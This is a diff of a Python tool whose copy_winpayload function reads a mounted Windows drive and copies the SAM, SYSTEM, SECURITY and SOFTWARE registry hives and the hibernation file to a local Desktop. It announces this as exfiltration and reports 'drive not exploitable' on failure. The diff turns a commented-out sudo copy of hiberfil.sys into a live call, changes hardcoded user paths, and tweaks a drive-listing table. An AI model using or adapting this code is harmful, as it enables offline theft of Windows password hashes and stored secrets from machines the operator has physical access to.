@@ -60,6 +60,7 @@ def copy_winpayload():
     #^^^ dumb idea probably. A good idea wouldl be to refactor this and get rid of the shit hardcoded values for copy dest!
     dirss = os.listdir('/media/windows')
     print(dirss)
+    
     for dirs in dirss:
         if "Windows" in str(dirs):
             print(type(dirs))
@@ -68,14 +69,24 @@ def copy_winpayload():
 
    
     try:
-        shutil.copyfile('/media/windows/Windows/System32/config/SAM', '/home/zigmo/Desktop/SAM')
-        shutil.copyfile('/media/windows/Windows/System32/config/SYSTEM', '/home/zigmo/Desktop/SYSTEM')
-        shutil.copyfile('/media/windows/Windows/System32/config/SECURITY', '/home/zigmo/Desktop/SECURITY')
-        shutil.copyfile('/media/windows/Windows/System32/config/SOFTWARE', '/home/zigmo/Desktop/SOFTWARE')
+
+        print(os.listdir('/media/windows/Windows/System32'))
+        shutil.copyfile('/media/windows/Windows/System32/config/SAM', '/home/galactic_t0ast/Desktop/SAM')
+        shutil.copyfile('/media/windows/Windows/System32/config/SYSTEM', '/home/galactic_t0ast/Desktop/SYSTEM')
+        shutil.copyfile('/media/windows/Windows/System32/config/SECURITY', '/home/galactic_t0ast/Desktop/SECURITY')
+        shutil.copyfile('/media/windows/Windows/System32/config/SOFTWARE', '/home/galactic_t0ast/Desktop/SOFTWARE')
+
         
-        # subprocess.Popen('sudo cp /media/windows/hyberfil.sys /home/zigmo/Desktop', shell=True)
+        #shutil.copyfile('/media/windows/Windows/System32/config/SAM', '/home/zigmo/Desktop/SAM')
+        #shutil.copyfile('/media/windows/Windows/System32/config/SYSTEM', '/home/zigmo/Desktop/SYSTEM')
+        #shutil.copyfile('/media/windows/Windows/System32/config/SECURITY', '/home/zigmo/Desktop/SECURITY')
+        #shutil.copyfile('/media/windows/Windows/System32/config/SOFTWARE', '/home/zigmo/Desktop/SOFTWARE')
+        
+        subprocess.Popen('sudo cp /media/windows/hyberfil.sys /home/galactic_t0ast/Desktop', shell=True)
         print('hybernation file has been exfiltrated to /home/zigmo/Desktop/hyberfil.sys\nSYSTEM SAM SECURITY and SOFTWARE registry hives have been succesfully exfiltrated to /home/zigmo/Desktop')
-    except FileNotFoundError:
+    except FileNotFoundError as e:
+        print(e.strerror) 
+        print(e)
         print('drive not exploitable')
 
     #optimize this...
@@ -142,8 +153,10 @@ def pretty_print(drives):
     print("\n\t\t\t    *********************************************************************************************",end ="")
     print("\n\t\t\t    *\t\tDrive Location\t\t\t  File System\t\t\tMounted\t\t*",end ="")
     for drive in drives:
-        if len(drive.get_fs()) > 1:
+        if len(drive.get_fs()) > 6:
             print("\n\t\t\t    *\t\t  {}\t\t\t{}\t\t\t   {}\t\t*".format(drive.get_source(), drive.get_fs(), drive.is_mounted()), end="")
+        elif len(drive.get_fs()) == 4:
+            print("\n\t\t\t    *\t\t  {}\t\t\t{}\t\t\t\t   {}\t\t*".format(drive.get_source(), drive.get_fs(), drive.is_mounted()), end="")
     print("\n\t\t\t    *********************************************************************************************",end ="\n")
 
 
